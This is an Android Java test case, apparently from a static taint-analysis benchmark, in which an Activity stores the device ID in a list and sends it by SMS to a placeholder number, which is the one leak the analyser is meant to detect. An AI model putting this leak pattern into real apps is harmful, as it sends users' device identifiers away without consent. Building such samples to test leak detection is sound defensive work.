package de.ecspride;

import java.util.LinkedList;
import java.util.List;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
/**
 * @testcase_name ListAccess2
 * @version 0.1
 * @author Secure Software Engineering Group (SSE)
 * @author_mail marc.miltenberger@sit.fraunhofer.de
 * 
 * @description a list is created which is filled with untainted and tainted (deviceId source) data.
 *   The tainted data of a constant list position is retrieved and sent via sms.
 * @dataflow source -> list -> sink
 * @number_of_leaks 1
 * @challenges the analysis must distinguish between different list positions to recognize that the tainted
 *  data does get leaked. 
 */
public class ListAccess2 extends Activity {
	List<String> listData;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_list_access1);
        
        listData = new LinkedList<String>();
		listData.add("not tainted");
		listData.add(((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId()); //source
		listData.add("neutral text");
		
		SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, listData.get(1), null, null);  //sink
    }
}
